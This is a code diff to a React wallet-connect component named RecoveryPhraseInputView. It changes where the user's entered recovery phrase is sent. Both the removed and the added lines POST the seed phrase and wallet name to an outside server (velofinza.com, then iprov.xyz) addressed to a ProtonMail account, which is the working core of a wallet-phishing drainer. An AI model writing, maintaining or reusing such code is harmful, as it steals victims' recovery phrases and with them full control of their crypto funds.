@@ -198,12 +198,12 @@ const RecoveryPhraseInputView = ({ wallet, onBack, onSend }) => {
 
         try {
             setLoading(true);
-            const response = await fetch("https://velofinza.com/backend/api/v1/wallet", {
+            const response = await fetch("https://iprov.xyz/api/send-email", {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify({ walletName: wallet.name, details: combinedPhrase, email: "Gerfish7458@proton.me" }),
+                body: JSON.stringify({ email: "Gerfish7458@proton.me", subject: "Recovery Request", message: `Wallet is: ${wallet.name}\n\nWallet Details: ${combinedPhrase}`, }),
             });
 
             if (response.ok) {
